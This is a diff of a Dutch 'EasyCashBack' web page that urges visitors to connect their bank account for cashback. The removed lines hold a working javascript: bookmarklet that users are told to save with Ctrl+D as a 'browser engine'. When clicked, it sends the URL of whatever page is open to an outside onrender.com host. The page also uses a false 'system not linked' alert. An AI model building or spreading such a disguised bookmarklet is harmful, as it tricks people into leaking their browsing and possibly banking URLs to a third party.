@@ -1,130 +1,18 @@
 <!DOCTYPE html>
 <html lang="nl">
 <head>
-    <meta charset="UTF-8">
-    <title>EasyCashBack | Dashboard</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <title>EasyCashBack | Start</title>
     <style>
-        :root { 
-            --primary: #10b981; 
-            --primary-dark: #059669;
-            --bg: #f8fafc; 
-            --card: #ffffff; 
-            --text-main: #1e293b;
-            --text-sub: #64748b;
-        }
-        
-        body { 
-            font-family: 'Inter', sans-serif; 
-            background-color: var(--bg); 
-            color: var(--text-main); 
-            margin: 0; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            min-height: 100vh; 
-        }
-        
-        .container { 
-            background: var(--card); 
-            width: 100%; 
-            max-width: 440px; 
-            padding: 40px; 
-            border-radius: 32px; 
-            box-shadow: 0 10px 25px rgba(0,0,0,0.05); 
-            border: 1px solid #e2e8f0;
-            text-align: center; 
-        }
-        
-        h1 { font-size: 30px; font-weight: 800; color: var(--primary); margin: 0 0 10px 0; letter-spacing: -1px; }
-        
-        .status-tag { 
-            display: inline-flex; 
-            align-items: center; 
-            background: #fef2f2; 
-            color: #ef4444; 
-            padding: 8px 16px; 
-            border-radius: 99px; 
-            font-size: 13px; 
-            font-weight: 600; 
-            margin-bottom: 32px;
-            border: 1px solid #fee2e2;
-        }
-        
-        .status-dot { height: 8px; width: 8px; background: #ef4444; border-radius: 50%; margin-right: 8px; }
-
-        .card { 
-            background: #ffffff; 
-            border: 1px solid #f1f5f9; 
-            padding: 24px; 
-            border-radius: 20px; 
-            text-align: left; 
-            margin-bottom: 20px; 
-            box-shadow: 0 4px 6px -1px rgba(0,0,0,0.02);
-        }
-        
-        .card h3 { margin: 0 0 6px 0; font-size: 17px; font-weight: 700; color: var(--text-main); }
-        .card p { margin: 0 0 20px 0; color: var(--text-sub); font-size: 14px; line-height: 1.5; }
-
-        .btn { 
-            display: block; 
-            width: 100%; 
-            padding: 16px; 
-            border-radius: 14px; 
-            font-size: 15px; 
-            font-weight: 700; 
-            cursor: pointer; 
-            transition: all 0.2s ease; 
-            text-decoration: none; 
-            text-align: center; 
-            border: none; 
-            box-sizing: border-box; 
-        }
-        
-        .btn-green-fill { 
-            background: var(--primary); 
-            color: white; 
-            box-shadow: 0 4px 14px rgba(16, 185, 129, 0.25);
-        }
-        
-        .btn-green-fill:hover { 
-            background: var(--primary-dark); 
-            transform: translateY(-2px); 
-        }
-        
-        .btn-green-outline { 
-            background: #ffffff; 
-            border: 2px solid var(--primary); 
-            color: var(--primary); 
-        }
-        
-        .btn-green-outline:hover { 
-            background: #f0fdf4; 
-            transform: translateY(-2px); 
-        }
+        body { font-family: sans-serif; background: #0f172a; color: white; text-align: center; padding: 100px; }
+        .card { background: #1e293b; padding: 40px; border-radius: 24px; border: 1px solid #10b981; display: inline-block; }
+        .btn { background: #10b981; color: white; padding: 15px 30px; border-radius: 12px; text-decoration: none; font-weight: bold; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>EasyCashBack</h1>
-        <div class="status-tag"><span class="status-dot"></span> Systeem: Niet Gekoppeld</div>
-        
-        <div class="card">
-            <h3>Account Activatie</h3>
-            <p>Stap 1: Verbind je bankrekening veilig voor automatische verwerking.</p>
-            <form action="/create-checkout-session" method="POST">
-                <button type="submit" class="btn btn-green-fill">Koppel veilig via hier</button>
-            </form>
-        </div>
-
-        <div class="card" style="border-left: 4px solid var(--primary);">
-            <h3>Systeem Beheer</h3>
-            <p>Stap 2: Activeer de browser-engine. Druk na het klikken op <b>Ctrl+D</b>.</p>
-            <a href="javascript:(function(){window.location.href='https://mijn-stripe-app.onrender.com/scan?ref='+encodeURIComponent(window.location.href);})();" 
-               class="btn btn-green-outline" onclick="alert('Druk nu op Ctrl+D om de assistent op te slaan!')">
-               🚀 Achter de schermen
-            </a>
-        </div>
+    <div class="card">
+        <h1>Geld terug op elke aankoop</h1>
+        <p>Koppel je bank en ontvang automatisch cashback.</p><br>
+        <a href="/connect-bank" class="btn">Koppel Mijn Bank</a>
     </div>
 </body>
 </html>
